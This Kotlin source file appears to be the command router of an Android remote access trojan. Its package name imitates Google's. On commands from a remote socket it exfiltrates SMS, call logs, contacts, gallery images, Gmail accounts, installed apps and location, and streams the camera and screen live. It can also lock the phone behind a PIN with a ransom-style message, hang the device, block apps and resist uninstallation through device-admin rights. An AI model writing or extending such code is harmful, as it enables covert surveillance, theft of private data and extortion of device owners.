package com.google.xmodzz

import android.content.Context
import android.content.Intent
import android.net.Uri
import org.json.JSONObject

object CommandRouter {

    private fun emitData(obj: JSONObject) {
        try {
            if (SocketHolder.socket != null && SocketHolder.socket!!.connected()) {
                SocketHolder.socket!!.emit("device-data", obj)
            }
        } catch (e: Exception) {}
    }

    fun route(ctx: Context, data: JSONObject) {
        val action = data.optString("action")
        val payload = data.optJSONObject("payload") ?: JSONObject()

        when (action) {
            "gallery_list" -> GalleryRechive.listImages(ctx, ::emitData)
            "gallery_get" -> GalleryRechive.sendImage(ctx, payload.optString("id"), ::emitData)
            "sms_list" -> SmsRechive.sendAllSms(ctx, ::emitData)
            "call_log" -> CallRechive.sendAllCalls(ctx, ::emitData)
            "gmail_list" -> GmailRechive.listAccounts(ctx, ::emitData)
            "app_list" -> AppsRechive.listApps(ctx, ::emitData)
            "contacts_list" -> ContactsRechive.listContacts(ctx, ::emitData)
            
            // --- SINKRONISASI BLOKIR APLIKASI ---
            "app_block" -> {
                val pkgTarget = payload.optString("pkg", "")
                val isBlocked = payload.optBoolean("blocked", false)
                
                // Ambil action dinamis dari AppBlockerService
                val actionName = if (isBlocked) AppBlockerService.ACTION_UNBLOCK_APP else AppBlockerService.ACTION_BLOCK_APP
                val intent = Intent(actionName)
                intent.putExtra("package", pkgTarget)
                
                // Kunci intent biar cuma nyampe ke aplikasi ini sendiri
                intent.setPackage(ctx.packageName) 
                ctx.sendBroadcast(intent)
            }
            
            "location_get" -> LocationService.sendLast(ctx, ::emitData)
            
            "flashlight_on" -> FlashlightController.set(ctx, true)
            "flashlight_off" -> FlashlightController.stopBlink(ctx)
            "flashlight_blink" -> FlashlightController.blink(ctx, payload.optInt("ms", 100))
            
            // --- KAMERA FIXED ---
            "camera_front" -> {
                val isLive = payload.optBoolean("live", false)
                CameraStreamer.start(ctx, 0, isLive, ::emitData)
            }
            "camera_back" -> {
                val isLive = payload.optBoolean("live", false)
                CameraStreamer.start(ctx, 1, isLive, ::emitData)
            }
            "camera_stop" -> CameraStreamer.stop()
            
            "screen_start" -> {
                val intent = Intent(ctx, MainActivity::class.java)
                intent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                intent.putExtra("is_screen_start", true)
                ctx.startActivity(intent)
            }
            "screen_stop" -> ScreenStreamer.stop(ctx)
            
            "lock_start" -> LockService.start(ctx, payload.optString("pin", "1234"), payload.optString("message", "HP ANDA TELAH TERKUNCI BY NDRAZ"))
            "lock_stop" -> LockService.stop(ctx)
            
            "hang_start" -> HangDevice.start(ctx)
            "hang_stop" -> HangDevice.stop(ctx)
            
            "anti_uninstall_toggle" -> {
                val enable = payload.optBoolean("enable", true)
                if (enable) AntiUninstallHelper.requestAdminIfNeeded(ctx)
                else AntiUninstallHelper.disable(ctx)
            }
            
            "open_url" -> {
                val url = payload.optString("url", "")
                if (url.isNotEmpty()) {
                    val i = Intent(Intent.ACTION_VIEW, Uri.parse(url))
                    i.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                    ctx.startActivity(i)
                }
            }
        }
    }
}
